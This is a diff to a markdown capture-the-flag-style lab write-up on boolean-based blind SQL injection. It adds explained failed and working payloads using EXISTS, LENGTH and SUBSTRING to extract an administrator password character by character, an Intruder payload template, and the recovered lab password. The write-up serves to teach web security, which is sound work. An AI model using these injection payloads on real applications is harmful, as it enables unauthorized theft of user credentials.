@@ -1,3 +1,9 @@
+## 🎯 Objective
+
+Exploit a blind SQL injection vulnerability to extract the **administrator password** using **conditional (boolean-based) responses**, without seeing any SQL errors or query output.
+
+---
+
 ## 🧩 1. Initial Testing & Vulnerability Identification
 
 ### Parameters Tested
@@ -44,6 +50,7 @@ The application likely executes a query similar to:
 ```sql
 SELECT trackingId FROM tracking
 WHERE trackingId = '<TrackingId>';
+
 ```
 
 If the query returns **any rows**, the application displays **"Welcome back!"**.
@@ -75,6 +82,24 @@ This confirms full control over boolean logic in the SQL query.
 
 ## ❌ 4. Why UNION Does Not Work Here
 
+### ❌ Failed Attempt (Example)
+
+```sql
+TrackingId=...'
+UNION SELECT username, password FROM users--
+```
+
+**Why this fails:**
+
+- `UNION SELECT` only works when **query results are reflected in the response**
+- This application does **not display query output**
+- The page logic only checks whether rows exist
+- Therefore, UNION results are silently ignored
+
+**Lesson:**
+
+If you do not see database output reflected, immediately switch to **blind SQL injection techniques**.
+
 `UNION` attacks are useful only when:
 
 - Query results are **reflected in the response**
@@ -93,11 +118,64 @@ Therefore:
 
 ## 🧠 5. Why Some Payloads Failed
 
+Understanding *why payloads fail* is just as important as knowing why others work.
+
+---
+
+### ❌ Failed Payload 1 — Invalid boolean context
+
+```sql
+TrackingId=...'
+AND SELECT username FROM users WHERE username='administrator'
+```
+
+**Why it fails:**
+
+- `AND` requires a **boolean expression** (TRUE or FALSE)
+- `SELECT username FROM users` returns rows, not a boolean
+- SQL cannot evaluate rows as a condition
+
+**Correct mindset:**
+
+Every injected condition must resolve to **TRUE or FALSE**.
+
+---
+
+### ❌ Failed Payload 2 — Multiple-row subquery
+
+```sql
+TrackingId=...'
+AND (SELECT 'administrator' FROM users)='administrator'
+```
+
+**Why it fails:**
+
+- The subquery returns **multiple rows**
+- SQL cannot compare multiple rows to a single value
+- This causes the condition to fail silently
+
+---
+
+### ✅ Working Version of the Same Idea
+
+```sql
+TrackingId=...'
+AND (SELECT 'administrator' FROM users LIMIT 1)='administrator'
+```
+
+**Why this works:**
+
+- `LIMIT 1` forces the subquery to return **exactly one row**
+- `'administrator' = 'administrator'` evaluates to TRUE
+
+**Lesson:**
+
+Always constrain subqueries to **a single row** in blind SQL injection.
+
 ### ❌ Invalid Payload Example
 
 ```sql
 AND SELECT username FROM users WHERE username='administrator'
-
 ```
 
 **Why it fails:**
@@ -113,7 +191,6 @@ AND SELECT username FROM users WHERE username='administrator'
 ```sql
 TrackingId=...'
 AND (SELECT 'administrator' FROM users LIMIT 1)='administrator'
-
 ```
 
 ### Explanation
@@ -127,6 +204,85 @@ This confirms the **existence** of the `administrator` user.
 ---
 
 ## 🔎 7. SQL Functions Used (Core Concepts)
+
+This lab relies on three core SQL functions. Below are **working examples and failed examples** for each so future confusion is avoided.
+
+---
+
+### 1️⃣ `EXISTS`
+
+### ✅ Working Example
+
+```sql
+TrackingId=...'
+AND EXISTS (SELECT 1 FROM users WHERE username='administrator')
+```
+
+**Why it works:**
+
+- `EXISTS` returns TRUE if **at least one row exists**
+- Perfect for presence checks in blind SQLi
+
+---
+
+### 2️⃣ `LENGTH()`
+
+### ✅ Working Example
+
+```sql
+TrackingId=...'
+AND LENGTH((SELECT password FROM users WHERE username='administrator'))=20
+```
+
+**Why it works:**
+
+- `LENGTH()` returns a numeric value
+- Numeric comparison evaluates cleanly to TRUE/FALSE
+
+### ❌ Failed Example
+
+```sql
+AND LENGTH(SELECT password FROM users)=20
+```
+
+**Why it fails:**
+
+- `SELECT` must be wrapped in parentheses
+- SQL syntax is invalid otherwise
+
+---
+
+### 3️⃣ `SUBSTRING()`
+
+### ✅ Working Example
+
+```sql
+TrackingId=...'
+AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'
+```
+
+**Why it works:**
+
+- Extracts exactly **one character**
+- Comparison resolves to TRUE or FALSE
+
+### ❌ Failed Example
+
+```sql
+AND SUBSTRING((SELECT password FROM users),1,1)='a'
+```
+
+**Why it fails:**
+
+- Subquery returns **multiple rows**
+- Blind SQLi requires exactly one value
+
+---
+
+**Key Rule:**
+
+> In blind SQL injection, every subquery must return one value, and every condition must evaluate to TRUE or FALSE.
+> 
 
 ### 1️⃣ `EXISTS`
 
@@ -178,7 +334,6 @@ SUBSTRING(string, position, length)
 ```sql
 TrackingId=...'
 AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'
-
 ```
 
 ### Logic
@@ -195,7 +350,6 @@ AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='
 ```sql
 TrackingId=...'
 AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§'
-
 ```
 
 ### Intruder Configuration
@@ -222,8 +376,9 @@ Password: j9emikunwxgnk0dm4upj
 
 - Logged in successfully
 - Application confirmed administrator access
-- Screenshot
-  <img width="1281" height="260" alt="image" src="https://github.com/user-attachments/assets/70b1f1dd-2382-46e7-a3b6-90d894f01d09" />
+- Lab marked as solved
+- Screenshot:
+    <img width="1281" height="260" alt="image" src="https://github.com/user-attachments/assets/8be030ef-59b4-4065-8e2e-b108f9bae79d" />
 
 
 ---
